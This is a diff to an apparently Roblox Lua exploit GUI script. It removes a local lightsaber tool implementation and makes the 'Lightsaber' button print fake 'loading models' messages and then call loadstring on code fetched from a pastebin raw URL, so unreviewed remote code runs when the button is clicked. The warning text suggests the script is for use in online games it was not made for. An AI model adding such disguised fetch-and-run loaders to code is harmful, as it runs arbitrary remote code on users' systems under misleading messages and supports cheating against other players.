@@ -11246,104 +11246,12 @@ button.FontSize = "Size14"
 button.Text = "Lightsaber"
 button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
-	--// MODERN FIXED BASE (REPLACES YOUR BROKEN TOP SECTION)
-
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local backpack = player:WaitForChild("Backpack")
-local gui = player:WaitForChild("PlayerGui")
-
--- Character loading (FIXED)
-local char = player.Character or player.CharacterAdded:Wait()
-
-local function getCharParts()
-	char = player.Character or player.CharacterAdded:Wait()
-
-	local humanoid = char:WaitForChild("Humanoid")
-	local head = char:WaitForChild("Head")
-
-	-- R6 / R15 support
-	local torso = char:FindFirstChild("Torso") or char:WaitForChild("UpperTorso")
-	local rightArm = char:FindFirstChild("Right Arm") or char:FindFirstChild("RightHand")
-	local leftArm = char:FindFirstChild("Left Arm") or char:FindFirstChild("LeftHand")
-
-	return humanoid, head, torso, rightArm, leftArm
-end
-
-local humanoid, head, torso, rightArm, leftArm = getCharParts()
-
-player.CharacterAdded:Connect(function()
-	humanoid, head, torso, rightArm, leftArm = getCharParts()
-end)
-
--- Tool (REPLACES HopperBin)
-local tool = Instance.new("Tool")
-tool.Name = "Light Saber"
-tool.RequiresHandle = false
-tool.Parent = backpack
-
-local mouse = nil
-
-tool.Equipped:Connect(function(m)
-	mouse = m
-end)
-
--- Safe destroy (REPLACES :Remove())
-local function safeDestroy(obj)
-	if obj and obj.Parent then
-		obj:Destroy()
-	end
-end
-
--- Fixed table search
-local function tableFind(tab, val)
-	for i,v in ipairs(tab) do
-		if v == val then
-			return i
-		end
-	end
-	return nil
-end
-
--- Damage system (LOCAL ONLY – you should server this later)
-local function damageHumanoid(hum, dmg)
-	if hum and hum.Health > 0 then
-		hum:TakeDamage(dmg)
-	end
-end
-
--- Basic saber part (TEST)
-local blade = Instance.new("Part")
-blade.Size = Vector3.new(0.3, 4, 0.3)
-blade.Color = Color3.fromRGB(255, 0, 0)
-blade.Material = Enum.Material.Neon
-blade.CanCollide = false
-blade.Anchored = false
-blade.Name = "Blade"
-
-local weld = Instance.new("WeldConstraint")
-
-tool.Equipped:Connect(function()
-	if not rightArm then return end
-
-	blade.Parent = char
-	blade.CFrame = rightArm.CFrame
-
-	weld.Part0 = blade
-	weld.Part1 = rightArm
-	weld.Parent = blade
-end)
-
-tool.Unequipped:Connect(function()
-	safeDestroy(blade)
-end)
-
--- Basic hit detection
-blade.Touched:Connect(function(hit)
-	local hum = hit.Parent:FindFirstChild("Humanoid")
-	if hum and hit.Parent ~= char then
-		damageHumanoid(hum, 20)
-	end
+	print("Sorry, LightSaber has Not Loaded Yet!")
+    print("Loading Models For The LightSaber...")
+    print("Hold On, The LoadString Is Doing Its Thing...")
+    print("DO NOT LEAVE OR TOOL WILL CRASH!!!!")
+    print("WARNING: The Game That Your Playing Is Not ClientSided, Use At Your Own Risk!!!")
+    loadstring(game:HttpGet("https://pastebin.com/raw/KdVq9EHW", true))()
 end)
 --
 local button = Instance.new("TextButton")
